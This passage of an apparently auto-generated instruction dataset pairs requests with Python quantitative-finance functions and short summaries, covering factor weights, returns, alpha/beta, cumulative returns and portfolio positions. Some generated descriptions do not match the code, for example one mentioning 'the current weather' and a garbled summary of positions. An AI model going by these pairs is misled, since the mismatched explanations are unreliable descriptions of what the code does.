value.\n    \"\"\"\n\n    def to_weights(group, _demeaned, _equal_weight):\n\n        if _equal_weight:\n            group = group.copy()\n\n            if _demeaned:\n                # top assets positive weights, bottom ones negative\n                group = group - group.median()\n\n            negative_mask = group < 0\n            group[negative_mask] = -1.0\n            positive_mask = group > 0\n            group[positive_mask] = 1.0\n\n            if _demeaned:\n                # positive weights must equal negative weights\n                if negative_mask.any():\n                    group[negative_mask] /= negative_mask.sum()\n                if positive_mask.any():\n                    group[positive_mask] /= positive_mask.sum()\n\n        elif _demeaned:\n            group = group - group.mean()\n\n        return group / group.abs().sum()\n\n    grouper = [factor_data.index.get_level_values('date')]\n    if group_adjust:\n        grouper.append('group')\n\n    weights = factor_data.groupby(grouper)['factor'] \\\n        .apply(to_weights, demeaned, equal_weight)\n\n    if group_adjust:\n        weights = weights.groupby(level='date').apply(to_weights, False, False)\n\n    return weights", "response": "Computes the asset weights for a single alpha factor and forward returns for a single group neutral portfolio."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a DataFrame containing the period wise factor returns for a single alpha factor and a factor value for each period.", "response": "def factor_returns(factor_data,\n                   demeaned=True,\n                   group_adjust=False,\n                   equal_weight=False,\n                   by_asset=False):\n    \"\"\"\n    Computes period wise returns for portfolio weighted by factor\n    values.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    demeaned : bool\n        Control how to build factor weights\n        -- see performance.factor_weights for a full explanation\n    group_adjust : bool\n        Control how to build factor weights\n        -- see performance.factor_weights for a full explanation\n    equal_weight : bool, optional\n        Control how to build factor weights\n        -- see performance.factor_weights for a full explanation\n    by_asset: bool, optional\n        If True, returns are reported separately for each esset.\n\n    Returns\n    -------\n    returns : pd.DataFrame\n        Period wise factor returns\n    \"\"\"\n\n    weights = \\\n        factor_weights(factor_data, demeaned, group_adjust, equal_weight)\n\n    weighted_returns = \\\n        factor_data[utils.get_forward_returns_columns(factor_data.columns)] \\\n        .multiply(weights, axis=0)\n\n    if by_asset:\n        returns = weighted_returns\n    else:\n        returns = weighted_returns.groupby(level='date').sum()\n\n    return returns"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncomputing the alpha beta for a given factor and returns.", "response": "def factor_alpha_beta(factor_data,\n                      returns=None,\n                      demeaned=True,\n                      group_adjust=False,\n                      equal_weight=False):\n    \"\"\"\n    Compute the alpha (excess returns), alpha t-stat (alpha significance),\n    and beta (market exposure) of a factor. A regression is run with\n    the period wise factor universe mean return as the independent variable\n    and mean period wise return from a portfolio weighted by factor values\n    as the dependent variable.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    returns : pd.DataFrame, optional\n        Period wise factor returns. If this is None then it will be computed\n        with 'factor_returns' function and the passed flags: 'demeaned',\n        'group_adjust', 'equal_weight'\n    demeaned : bool\n        Control how to build factor returns used for alpha/beta computation\n        -- see performance.factor_return for a full explanation\n    group_adjust : bool\n        Control how to build factor returns used for alpha/beta computation\n        -- see performance.factor_return for a full explanation\n    equal_weight : bool, optional\n        Control how to build factor returns used for alpha/beta computation\n        -- see performance.factor_return for a full explanation\n\n    Returns\n    -------\n    alpha_beta : pd.Series\n        A list containing the alpha, beta, a t-stat(alpha)\n        for the given factor and forward returns.\n    \"\"\"\n\n    if returns is None:\n        returns = \\\n            factor_returns(factor_data, demeaned, group_adjust, equal_weight)\n\n    universe_ret = factor_data.groupby(level='date')[\n        utils.get_forward_returns_columns(factor_data.columns)] \\\n        .mean().loc[returns.index]\n\n    if isinstance(returns, pd.Series):\n        returns.name = universe_ret.columns.values[0]\n        returns = pd.DataFrame(returns)\n\n    alpha_beta = pd.DataFrame()\n    for period in returns.columns.values:\n        x = universe_ret[period].values\n        y = returns[period].values\n        x = add_constant(x)\n\n        reg_fit = OLS(y, x).fit()\n        try:\n            alpha, beta = reg_fit.params\n        except ValueError:\n            alpha_beta.loc['Ann. alpha', period] = np.nan\n            alpha_beta.loc['beta', period] = np.nan\n        else:\n            freq_adjust = pd.Timedelta('252Days') / pd.Timedelta(period)\n\n            alpha_beta.loc['Ann. alpha', period] = \\\n                (1 + alpha) ** freq_adjust - 1\n            alpha_beta.loc['beta', period] = beta\n\n    return alpha_beta"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds the cumulative returns from the given period returns.", "response": "def cumulative_returns(returns, period, freq=None):\n    \"\"\"\n    Builds cumulative returns from 'period' returns. This function simulates\n    the cumulative effect that a series of gains or losses (the 'returns')\n    have on an original amount of capital over a period of time.\n\n    if F is the frequency at which returns are computed (e.g. 1 day if\n    'returns' contains daily values) and N is the period for which the retuns\n    are computed (e.g. returns after 1 day, 5 hours or 3 days) then:\n    - if N <= F the cumulative retuns are trivially computed as Compound Return\n    - if N > F (e.g. F 1 day, and N is 3 days) then the returns overlap and the\n      cumulative returns are computed building and averaging N interleaved sub\n      portfolios (started at subsequent periods 1,2,..,N) each one rebalancing\n      every N periods. This correspond to an algorithm which trades the factor\n      every single time it is computed, which is statistically more robust and\n      with a lower volatity compared to an algorithm that trades the factor\n      every N periods and whose returns depend on the specific starting day of\n      trading.\n\n    Also note that when the factor is not computed at a specific frequency, for\n    exaple a factor representing a random event, it is not efficient to create\n    multiples sub-portfolios as it is not certain when the factor will be\n    traded and this would result in an underleveraged portfolio. In this case\n    the simulated portfolio is fully invested whenever an event happens and if\n    a subsequent event occur while the portfolio is still invested in a\n    previous event then the portfolio is rebalanced and split equally among the\n    active events.\n\n    Parameters\n    ----------\n    returns: pd.Series\n        pd.Series containing factor 'period' forward returns, the index\n        contains timestamps at which the trades are computed and the values\n        correspond to returns after 'period' time\n    period: pandas.Timedelta or string\n        Length of period for which the returns are computed (1 day, 2 mins,\n        3 hours etc). It can be a Timedelta or a string in the format accepted\n        by Timedelta constructor ('1 days', '1D', '30m', '3h', '1D1h', etc)\n    freq : pandas DateOffset, optional\n        Used to specify a particular trading calendar. If not present\n        returns.index.freq will be used\n\n    Returns\n    -------\n    Cumulative returns series : pd.Series\n        Example:\n            2015-07-16 09:30:00  -0.012143\n            2015-07-16 12:30:00   0.012546\n            2015-07-17 09:30:00   0.045350\n            2015-07-17 12:30:00   0.065897\n            2015-07-20 09:30:00   0.030957\n    \"\"\"\n\n    if not isinstance(period, pd.Timedelta):\n        period = pd.Timedelta(period)\n\n    if freq is None:\n        freq = returns.index.freq\n\n    if freq is None:\n        freq = BDay()\n        warnings.warn(\"'freq' not set, using business day calendar\",\n                      UserWarning)\n\n    #\n    # returns index contains factor computation timestamps, then add returns\n    # timestamps too (factor timestamps + period) and save them to 'full_idx'\n    # Cumulative returns will use 'full_idx' index,because we want a cumulative\n    # returns value for each entry in 'full_idx'\n    #\n    trades_idx = returns.index.copy()\n    returns_idx = utils.add_custom_calendar_timedelta(trades_idx, period, freq)\n    full_idx = trades_idx.union(returns_idx)\n\n    #\n    # Build N sub_returns from the single returns Series. Each sub_retuns\n    # stream will contain non-overlapping returns.\n    # In the next step we'll compute the portfolio returns averaging the\n    # returns happening on those overlapping returns streams\n    #\n    sub_returns = []\n    while len(trades_idx) > 0:\n\n        #\n        # select non-overlapping returns starting with first timestamp in index\n        #\n        sub_index = []\n        next = trades_idx.min()\n        while next <= trades_idx.max():\n            sub_index.append(next)\n            next = utils.add_custom_calendar_timedelta(next, period, freq)\n            # make sure to fetch the next available entry after 'period'\n            try:\n                i = trades_idx.get_loc(next, method='bfill')\n                next = trades_idx[i]\n            except KeyError:\n                break\n\n        sub_index = pd.DatetimeIndex(sub_index, tz=full_idx.tz)\n        subret = returns[sub_index]\n\n        # make the index to have all entries in 'full_idx'\n        subret = subret.reindex(full_idx)\n\n        #\n        # compute intermediate returns values for each index in subret that are\n        # in between the timestaps at which the factors are computed and the\n        # timestamps at which the 'period' returns actually happen\n        #\n        for pret_idx in reversed(sub_index):\n\n            pret = subret[pret_idx]\n\n            # get all timestamps between factor computation and period returns\n            pret_end_idx = \\\n                utils.add_custom_calendar_timedelta(pret_idx, period, freq)\n            slice = subret[(subret.index > pret_idx) & (\n                subret.index <= pret_end_idx)].index\n\n            if pd.isnull(pret):\n                continue\n\n            def rate_of_returns(ret, period):\n                return ((np.nansum(ret) + 1)**(1. / period)) - 1\n\n            # compute intermediate 'period' returns values, note that this also\n            # moves the final 'period' returns value from trading timestamp to\n            # trading timestamp + 'period'\n            for slice_idx in slice:\n                sub_period = utils.diff_custom_calendar_timedeltas(\n                    pret_idx, slice_idx, freq)\n                subret[slice_idx] = rate_of_returns(pret, period / sub_period)\n\n            subret[pret_idx] = np.nan\n\n            # transform returns as percentage change from previous value\n            subret[slice[1:]] = (subret[slice] + 1).pct_change()[slice[1:]]\n\n        sub_returns.append(subret)\n        trades_idx = trades_idx.difference(sub_index)\n\n    #\n    # Compute portfolio cumulative returns averaging the returns happening on\n    # overlapping returns streams.\n    #\n    sub_portfolios = pd.concat(sub_returns, axis=1)\n    portfolio = pd.Series(index=sub_portfolios.index)\n\n    for i, (index, row) in enumerate(sub_portfolios.iterrows()):\n\n        # check the active portfolios, count() returns non-nans elements\n        active_subfolios = row.count()\n\n        # fill forward portfolio value\n        portfolio.iloc[i] = portfolio.iloc[i - 1] if i > 0 else 1.\n\n        if active_subfolios <= 0:\n            continue\n\n        # current portfolio is the average of active sub_portfolios\n        portfolio.iloc[i] *= (row + 1).mean(skipna=True)\n\n    return portfolio"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef positions(weights, period, freq=None):\n\n    weights = weights.unstack()\n\n    if not isinstance(period, pd.Timedelta):\n        period = pd.Timedelta(period)\n\n    if freq is None:\n        freq = weights.index.freq\n\n    if freq is None:\n        freq = BDay()\n        warnings.warn(\"'freq' not set, using business day calendar\",\n                      UserWarning)\n\n    #\n    # weights index contains factor computation timestamps, then add returns\n    # timestamps too (factor timestamps + period) and save them to 'full_idx'\n    # 'full_idx' index will contain an entry for each point in time the weights\n    # change and hence they have to be re-computed\n    #\n    trades_idx = weights.index.copy()\n    returns_idx = utils.add_custom_calendar_timedelta(trades_idx, period, freq)\n    weights_idx = trades_idx.union(returns_idx)\n\n    #\n    # Compute portfolio weights for each point in time contained in the index\n    #\n    portfolio_weights = pd.DataFrame(index=weights_idx,\n                                     columns=weights.columns)\n    active_weights = []\n\n    for curr_time in weights_idx:\n\n        #\n        # fetch new weights that become available at curr_time and store them\n        # in active weights\n        #\n        if curr_time in weights.index:\n            assets_weights = weights.loc[curr_time]\n            expire_ts = utils.add_custom_calendar_timedelta(curr_time,\n                                                            period, freq)\n            active_weights.append((expire_ts, assets_weights))\n\n        #\n        # remove expired entry in active_weights (older than 'period')\n        #\n        if active_weights:\n            expire_ts, assets_weights = active_weights[0]\n            if expire_ts <= curr_time:\n                active_weights.pop(0)\n\n        if not active_weights:\n            continue\n        #\n        # Compute total weights for curr_time and store them\n        #\n        tot_weights = [w for (ts, w) in active_weights]\n        tot_weights = pd.concat(tot_weights, axis=1)\n        tot_weights = tot_weights.sum(axis=1)\n        tot_weights /= tot_weights.abs().sum()\n\n        portfolio_weights.loc[curr_time] = tot_weights\n\n    return portfolio_weights.fillna(0)", "response": "Builds net position values time series for each asset in the next position."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef mean_return_by_quantile(factor_data,\n                            by_date=False,\n                            by_group=False,\n                            demeaned=True,\n                            group_adjust=False):\n    \"\"\"\n    Computes mean returns for factor quantiles across\n    provided forward returns columns.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    by_date : bool\n        If True, compute quantile bucket returns separately for each date.\n    by_group : bool\n        If True, compute quantile bucket returns separately for each group.\n    demeaned : bool\n        Compute demeaned mean returns (long short portfolio)\n    group_adjust : bool\n        Returns demeaning will occur on the group level.\n\n    Returns\n    -------\n    mean_ret : pd.DataFrame\n        Mean period wise returns by specified factor quantile.\n    std_error_ret : pd.DataFrame\n        Standard error of returns by specified quantile.\n    \"\"\"\n\n    if group_adjust:\n        grouper = [factor_data.index.get_level_values('date')] + ['group']\n        factor_data = utils.demean_forward_returns(factor_data, grouper)\n    elif demeaned:\n        factor_data = utils.demean_forward_returns(factor_data)\n    else:\n        factor_data = factor_data.copy()\n\n    grouper = ['factor_quantile', factor_data.index.get_level_values('date')]\n\n    if by_group:\n        grouper.append('group')\n\n    group_stats = factor_data.groupby(grouper)[\n        utils.get_forward_returns_columns(factor_data.columns)] \\\n        .agg(['mean', 'std', 'count'])\n\n    mean_ret = group_stats.T.xs('mean', level=1).T\n\n    if not by_date:\n        grouper = [mean_ret.index.get_level_values('factor_quantile')]\n        if by_group:\n            grouper.append(mean_ret.index.get_level_values('group'))\n        group_stats = mean_ret.groupby(grouper)\\\n            .agg(['mean', 'std', 'count'])\n        mean_ret = group_stats.T.xs('mean', level=1).T\n\n    std_error_ret = group_stats.T.xs('std', level=1).T \\\n        / np.sqrt(group_stats.T.xs('count', level=1).T)\n\n    return mean_ret, std_error_ret", "response": "Compute mean returns for a single alpha factor and a single group of returns."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncompute the difference between the mean returns of the current weather and the standard error of the two quantiles.", "response": "def compute_mean_returns_spread(mean_returns,\n                                upper_quant,\n                                lower_quant,\n                                std_err=None):\n    \"\"\"\n    Computes the difference between the mean returns of\n    two quantiles. Optionally, computes the standard error\n    of this difference.\n\n    Parameters\n    ----------\n    mean_returns : pd.DataFrame\n        DataFrame of mean period wise returns by quantile.\n        MultiIndex containing date and quantile.\n        See mean_return_by_quantile.\n    upper_quant : int\n        Quantile of mean return from which we\n        wish to subtract lower quantile mean return.\n    lower_quant : int\n        Quantile of mean return we wish to subtract\n        from upper quantile mean return.\n    std_err : pd.DataFrame, optional\n        Period wise standard error in mean return by quantile.\n        Takes the same form as mean_returns.\n\n    Returns\n    -------\n    mean_return_difference : pd.Series\n        Period wise difference in quantile returns.\n    joint_std_err : pd.Series\n        Period wise standard error of the difference in quantile returns.\n        if std_err is None, this will be None\n    \"\"\"\n\n    mean_return_difference = mean_returns.xs(upper_quant,\n                                             level='factor_quantile') \\\n        - mean_returns.xs(lower_quant, level='factor_quantile')\n\n    if std_err is None:\n        joint_std_err = None\n    else:\n        std1 = std_err.xs(upper_quant, level='factor_quantile')\n        std2 = std_err.xs(lower_quant, level='factor_quantile')\n        joint_std_err = np.sqrt(std1**2 + std2**2)\n\n    return mean_return_difference, joint_std_err"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef quantile_turnover(quantile_factor, quantile, period=1):\n\n    quant_names = quantile_factor[quantile_factor == quantile]\n    quant_name_sets = quant_names.groupby(level=['date']).apply(\n        lambda x: set(x.index.get_level_values('asset')))\n\n    if isinstance(period, int):\n        name_shifted = quant_name_sets.shift(period)\n    else:\n        shifted_idx = utils.add_custom_calendar_timedelta(\n                quant_name_sets.index, -pd.Timedelta(period),\n                quantile_factor.index.levels[0].freq)\n        name_shifted = quant_name_sets.reindex(shifted_idx)\n        name_shifted.index = quant_name_sets.index\n\n    new_names = (quant_name_sets - name_shifted).dropna()\n    quant_turnover = new_names.apply(\n        lambda x: len(x)) / quant_name_sets.apply(lambda x: len(x))\n    quant_turnover.name = quantile\n    return quant_turnover", "response": "Computes the proportion of names in a factor quantile that were not in that quantile in the previous period."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef factor_rank_autocorrelation(factor_data, period=1):\n\n    grouper = [factor_data.index.get_level_values('date')]\n\n    ranks = factor_data.groupby(grouper)['factor'].rank()\n\n    asset_factor_rank = ranks.reset_index().pivot(index='date',\n                                                  columns='asset',\n                                                  values='factor')\n\n    if isinstance(period, int):\n        asset_shifted = asset_factor_rank.shift(period)\n    else:\n        shifted_idx = utils.add_custom_calendar_timedelta(\n                asset_factor_rank.index, -pd.Timedelta(period),\n                factor_data.index.levels[0].freq)\n        asset_shifted = asset_factor_rank.reindex(shifted_idx)\n        asset_shifted.index = asset_factor_rank.index\n\n    autocorr = asset_factor_rank.corrwith(asset_shifted, axis=1)\n    autocorr.name = period\n    return autocorr", "response": "Calculates autocorrelation of factor values in specified time spans."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef average_cumulative_return_by_quantile(factor_data,\n                                          prices,\n                                          periods_before=10,\n                                          periods_after=15,\n                                          demeaned=True,\n                                          group_adjust=False,\n                                          by_group=False):\n    \"\"\"\n    Plots average cumulative returns by factor quantiles in the period range\n    defined by -periods_before to periods_after\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    prices : pd.DataFrame\n        A wide form Pandas DataFrame indexed by date with assets\n        in the columns. Pricing data should span the factor\n        analysis time period plus/minus an additional buffer window\n        corresponding to periods_after/periods_before parameters.\n    periods_before : int, optional\n        How many periods before factor to plot\n    periods_after  : int, optional\n        How many periods after factor to plot\n    demeaned : bool, optional\n        Compute demeaned mean returns (long short portfolio)\n    group_adjust : bool\n        Returns demeaning will occur on the group level (group\n        neutral portfolio)\n    by_group : bool\n        If True, compute cumulative returns separately for each group\n    Returns\n    -------\n    cumulative returns and std deviation : pd.DataFrame\n        A MultiIndex DataFrame indexed by quantile (level 0) and mean/std\n        (level 1) and the values on the columns in range from\n        -periods_before to periods_after\n        If by_group=True the index will have an additional 'group' level\n        ::\n            ---------------------------------------------------\n                        |       | -2  | -1  |  0  |  1  | ...\n            ---------------------------------------------------\n              quantile  |       |     |     |     |     |\n            ---------------------------------------------------\n                        | mean  |  x  |  x  |  x  |  x  |\n                 1      ---------------------------------------\n                        | std   |  x  |  x  |  x  |  x  |\n            ---------------------------------------------------\n                        | mean  |  x  |  x  |  x  |  x  |\n                 2      ---------------------------------------\n                        | std   |  x  |  x  |  x  |  x  |\n            ---------------------------------------------------\n                ...     |                 ...\n            ---------------------------------------------------\n    \"\"\"\n\n    def cumulative_return(q_fact, demean_by):\n        return common_start_returns(q_fact, prices,\n                                    periods_before,\n                                    periods_after,\n                                    True, True, demean_by)\n\n    def average_cumulative_return(q_fact, demean_by):\n        q_returns = cumulative_return(q_fact, demean_by)\n        return pd.DataFrame({'mean': q_returns.mean(axis=1),\n                             'std': q_returns.std(axis=1)}).T\n\n    if by_group:\n        #\n        # Compute quantile cumulative returns separately for each group\n        # Deman those returns accordingly to 'group_adjust' and 'demeaned'\n        #\n        returns_bygroup = []\n\n        for group, g_data in factor_data.groupby('group'):\n            g_fq = g_data['factor_quantile']\n            if group_adjust:\n                demean_by = g_fq  # demeans at group level\n            elif demeaned:\n                demean_by = factor_data['factor_quantile']  # demean by all\n            else:\n                demean_by = None\n            #\n            # Align cumulative return from different dates to the same index\n            # then compute mean and std\n            #\n            avgcumret = g_fq.groupby(g_fq).apply(average_cumulative_return,\n                                                 demean_by)\n            if len(avgcumret) == 0:\n                continue\n\n            avgcumret['group'] = group\n            avgcumret.set_index('group', append=True, inplace=True)\n            returns_bygroup.append(avgcumret)\n\n        return pd.concat(returns_bygroup, axis=0)\n\n    else:\n        #\n        # Compute quantile cumulative returns for the full factor_data\n        # Align cumulative return from different dates to the same index\n        # then compute mean and std\n        # Deman those returns accordingly to 'group_adjust' and 'demeaned'\n        #\n        if group_adjust:\n            all_returns = []\n            for group, g_data in factor_data.groupby('group'):\n                g_fq = g_data['factor_quantile']\n                avgcumret = g_fq.groupby(g_fq).apply(cumulative_return, g_fq)\n                all_returns.append(avgcumret)\n            q_returns = pd.concat(all_returns, axis=1)\n            q_returns = pd.DataFrame({'mean': q_returns.mean(axis=1),\n                                      'std': q_returns.std(axis=1)})\n            return q_returns.unstack(level=1).stack(level=0)\n        elif demeaned:\n            fq = factor_data['factor_quantile']\n            return fq.groupby(fq).apply(average_cumulative_return, fq)\n        else:\n            fq = factor_data['factor_quantile']\n            return fq.groupby(fq).apply(average_cumulative_return, None)", "response": "Calculates the average cumulative returns for a single factor and a forward factor."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef factor_cumulative_returns(factor_data,\n                              period,\n                              long_short=True,\n                              group_neutral=False,\n                              equal_weight=False,\n                              quantiles=None,\n                              groups=None):\n    \"\"\"\n    Simulate a portfolio using the factor in input and returns the cumulative\n    returns of the simulated portfolio\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to,\n        and (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    period : string\n        'factor_data' column name corresponding to the 'period' returns to be\n        used in the computation of porfolio returns\n    long_short : bool, optional\n        if True then simulates a dollar neutral long-short portfolio\n        - see performance.create_pyfolio_input for more details\n    group_neutral : bool, optional\n        If True then simulates a group neutral portfolio\n        - see performance.create_pyfolio_input for more details\n    equal_weight : bool, optional\n        Control the assets weights:\n        - see performance.create_pyfolio_input for more details\n    quantiles: sequence[int], optional\n        Use only specific quantiles in the computation. By default all\n        quantiles are used\n    groups: sequence[string], optional\n        Use only specific groups in the computation. By default all groups\n        are used\n\n    Returns\n    -------\n    Cumulative returns series : pd.Series\n        Example:\n            2015-07-16 09:30:00  -0.012143\n            2015-07-16 12:30:00   0.012546\n            2015-07-17 09:30:00   0.045350\n            2015-07-17 12:30:00   0.065897\n            2015-07-20 09:30:00   0.030957\n    \"\"\"\n    fwd_ret_cols = utils.get_forward_returns_columns(factor_data.columns)\n\n    if period not in fwd_ret_cols:\n        raise ValueError(\"Period '%s' not found\" % period)\n\n    todrop = list(fwd_ret_cols)\n    todrop.remove(period)\n    portfolio_data = factor_data.drop(todrop, axis=1)\n\n    if quantiles is not None:\n        portfolio_data = portfolio_data[portfolio_data['factor_quantile'].isin(\n            quantiles)]\n\n    if groups is not None:\n        portfolio_data = portfolio_data[portfolio_data['group'].isin(groups)]\n\n    returns = \\\n        factor_returns(portfolio_data, long_short, group_neutral, equal_weight)\n\n    return cumulative_returns(returns[period], period)", "response": "Simulate a portfolio using a factor in input and returns the cumulative returns of the simulated portfolio."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nsimulate a portfolio using a factor in input and returns the assets positions as percentage of the total portfolio.", "response": "def factor_positions(factor_data,\n                     period,\n                     long_short=True,\n                     group_neutral=False,\n                     equal_weight=False,\n                     quantiles=None,\n                     groups=None):\n    \"\"\"\n    Simulate a portfolio using the factor in input and returns the assets\n    positions as percentage of the total portfolio.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to,\n        and (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    period : string\n        'factor_data' column name corresponding to the 'period' returns to be\n        used in the computation of porfolio returns\n    long_short : bool, optional\n        if True then simulates a dollar neutral long-short portfolio\n        - see performance.create_pyfolio_input for more details\n    group_neutral : bool, optional\n        If True then simulates a group neutral portfolio\n        - see performance.create_pyfolio_input for more details\n    equal_weight : bool, optional\n        Control the assets weights:\n        - see performance.create_pyfolio_input for more details.\n    quantiles: sequence[int], optional\n        Use only specific quantiles in the computation. By default all\n        quantiles are used\n    groups: sequence[string], optional\n        Use only specific groups in the computation. By default all groups\n        are used\n\n    Returns\n    -------\n    assets positions : pd.DataFrame\n        Assets positions series, datetime on index, assets on columns.\n        Example:\n            index                 'AAPL'         'MSFT'          cash\n            2004-01-09 10:30:00   13939.3800     -14012.9930     711.5585\n            2004-01-09 15:30:00       0.00       -16012.9930     411.5585\n            2004-01-12 10:30:00   14492.6300     -14624.8700       0.0\n            2004-01-12 15:30:00   14874.5400     -15841.2500       0.0\n            2004-01-13 10:30:00   -13853.2800    13653.6400      -43.6375\n    \"\"\"\n    fwd_ret_cols = utils.get_forward_returns_columns(factor_data.columns)\n\n    if period not in fwd_ret_cols:\n        raise ValueError(\"Period '%s' not found\" % period)\n\n    todrop = list(fwd_ret_cols)\n    todrop.remove(period)\n    portfolio_data = factor_data.drop(todrop, axis=1)\n\n    if quantiles is not None:\n        portfolio_data = portfolio_data[portfolio_data['factor_quantile'].isin(\n            quantiles)]\n\n    if groups is not None:\n        portfolio_data = portfolio_data[portfolio_data['group'].isin(groups)]\n\n    weights = \\\n        factor_weights(portfolio_data, long_short, group_neutral, equal_weight)\n\n    return positions(weights, period)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a new portfolio from a factor data set and return it.", "response": "def create_pyfolio_input(factor_data,\n                         period,\n                         capital=None,\n                         long_short=True,\n                         group_neutral=False,\n                         equal_weight=False,\n                         quantiles=None,\n                         groups=None,\n                         benchmark_period='1D'):\n    \"\"\"\n    Simulate a portfolio using the input factor and returns the portfolio\n    performance data properly formatted for Pyfolio analysis.\n\n    For more details on how this portfolio is built see:\n    - performance.cumulative_returns (how the portfolio returns are computed)\n    - performance.factor_weights (how assets weights are computed)\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to,\n        and (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    period : string\n        'factor_data' column name corresponding to the 'period' returns to be\n        used in the computation of porfolio returns\n    capital : float, optional\n        If set, then compute 'positions' in dollar amount instead of percentage\n    long_short : bool, optional\n        if True enforce a dollar neutral long-short portfolio: asset weights\n        will be computed by demeaning factor values and dividing by the sum of\n        their absolute value (achieving gross leverage of 1) which will cause\n        the portfolio to hold both long and short positions and the total\n        weights of both long and short positions will be equal.\n        If False the portfolio weights will be computed dividing the factor\n        values and  by the sum of their absolute value (achieving gross\n        leverage of 1). Positive factor values will generate long positions and\n        negative factor values will produce short positions so that a factor\n        with only posive values will result in a long only portfolio.\n    group_neutral : bool, optional\n        If True simulates a group neutral portfolio: the portfolio weights\n        will be computed so that each group will weigh the same.\n        if 'long_short' is enabled the factor values demeaning will occur on\n        the group level resulting in a dollar neutral, group neutral,\n        long-short portfolio.\n        If False group information will not be used in weights computation.\n    equal_weight : bool, optional\n        if True the assets will be equal-weighted. If long_short is True then\n        the factor universe will be split in two equal sized groups with the\n        top assets in long positions and bottom assets in short positions.\n        if False the assets will be factor-weighed, see 'long_short' argument\n    quantiles: sequence[int], optional\n        Use only specific quantiles in the computation. By default all\n        quantiles are used\n    groups: sequence[string], optional\n        Use only specific groups in the computation. By default all groups\n        are used\n    benchmark_period : string, optional\n        By default benchmark returns are computed as the factor universe mean\n        daily returns but 'benchmark_period' allows to choose a 'factor_data'\n        column corresponding to the returns to be used in the computation of\n        benchmark returns. More generally benchmark returns are computed as the\n        factor universe returns traded at 'benchmark_period' frequency, equal\n        weighting and long only\n\n\n    Returns\n    -------\n     returns : pd.Series\n        Daily returns of the strategy, noncumulative.\n         - Time series with decimal returns.\n         - Example:\n            2015-07-16    -0.012143\n            2015-07-17    0.045350\n            2015-07-20    0.030957\n            2015-07-21    0.004902\n\n     positions : pd.DataFrame\n        Time series of dollar amount (or percentage when 'capital' is not\n        provided) invested in each position and cash.\n         - Days where stocks are not held can be represented by 0.\n         - Non-working capital is labelled 'cash'\n         - Example:\n            index         'AAPL'         'MSFT'          cash\n            2004-01-09    13939.3800     -14012.9930     711.5585\n            2004-01-12    14492.6300     -14624.8700     27.1821\n            2004-01-13    -13853.2800    13653.6400      -43.6375\n\n\n     benchmark : pd.Series\n        Benchmark returns computed as the factor universe mean daily returns.\n\n    \"\"\"\n\n    #\n    # Build returns:\n    # we don't know the frequency at which the factor returns are computed but\n    # pyfolio wants daily returns. So we compute the cumulative returns of the\n    # factor, then resample it at 1 day frequency and finally compute daily\n    # returns\n    #\n    cumrets = factor_cumulative_returns(factor_data,\n                                        period,\n                                        long_short,\n                                        group_neutral,\n                                        equal_weight,\n                                        quantiles,\n                                        groups)\n    cumrets = cumrets.resample('1D').last().fillna(method='ffill')\n    returns = cumrets.pct_change().fillna(0)\n\n    #\n    # Build positions. As pyfolio asks for daily position we have to resample\n    # the positions returned by 'factor_positions' at 1 day frequency and\n    # recompute the weights so that the sum of daily weights is 1.0\n    #\n    positions = factor_positions(factor_data,\n                                 period,\n                                 long_short,\n                                 group_neutral,\n                                 equal_weight,\n                                 quantiles,\n                                 groups)\n    positions = positions.resample('1D').sum().fillna(method='ffill')\n    positions = positions.div(positions.abs().sum(axis=1), axis=0).fillna(0)\n    positions['cash'] = 1. - positions.sum(axis=1)\n\n    # transform percentage positions to dollar positions\n    if capital is not None:\n        positions = 